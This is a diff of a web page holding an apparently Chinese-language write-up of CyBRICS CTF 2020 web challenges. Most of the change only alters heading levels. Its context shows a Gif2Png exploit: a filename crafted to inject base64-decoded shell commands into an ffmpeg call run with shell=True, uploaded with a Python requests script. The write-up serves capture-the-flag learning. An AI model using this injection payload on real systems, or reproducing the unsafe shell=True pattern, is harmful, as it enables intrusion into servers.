@@ -253,8 +253,8 @@
 
   <div class="article-content">
     <div class="markdown-body">
-      <h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>一道简单的js，大致思路是通过控制台修改js里的函数然后删除已有的标签，重新运行初始化函数即可。</p>
-<h2 id="Gif2Png"><a href="#Gif2Png" class="headerlink" title="Gif2Png"></a>Gif2Png</h2><p>题目给了源码，flag在main.py文件中，利用的点很明显就是如下所示代码，其中文件名是可控的，所以直接命令注入即可。</p>
+      <h2 id="CyBRICS-CTF-2020-Web"><a href="#CyBRICS-CTF-2020-Web" class="headerlink" title="CyBRICS CTF 2020 Web"></a>CyBRICS CTF 2020 Web</h2><h3 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h3><p>一道简单的js，大致思路是通过控制台修改js里的函数然后删除已有的标签，重新运行初始化函数即可。</p>
+<h3 id="Gif2Png"><a href="#Gif2Png" class="headerlink" title="Gif2Png"></a>Gif2Png</h3><p>题目给了源码，flag在main.py文件中，利用的点很明显就是如下所示代码，其中文件名是可控的，所以直接命令注入即可。</p>
 <pre><code class="python">command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)</code></pre>
 <p>但是没有回显而且不出网，因此只能将文件复制到可以访问的地方，其中给了一个路由</p>
 <pre><code class="python">@app.route(&#39;/uploads/&lt;uid&gt;/&lt;image&gt;&#39;)
@@ -289,7 +289,7 @@ exp = f&quot;\&#39;||echo \&#39;{encoded}\&#39;|base64 -d|sh||\&#39;1.gif&quot;
 # Upload file
 files = {&#39;file&#39;:(exp, open(&#39;2.gif&#39;, &#39;rb&#39;), &#39;image/gif&#39;)}
 r = requests.post(&quot;http://gif2png-cybrics2020.ctf.su/&quot;, files=files)</code></pre>
-<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>这题代码有点多，但是可以利用的点似乎只有在calc里。</p>
+<h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h3><p>这题代码有点多，但是可以利用的点似乎只有在calc里。</p>
 <pre><code class="php">//calc.php
 &lt;?php
 if (!@$_SESSION[&#39;userid&#39;]) {
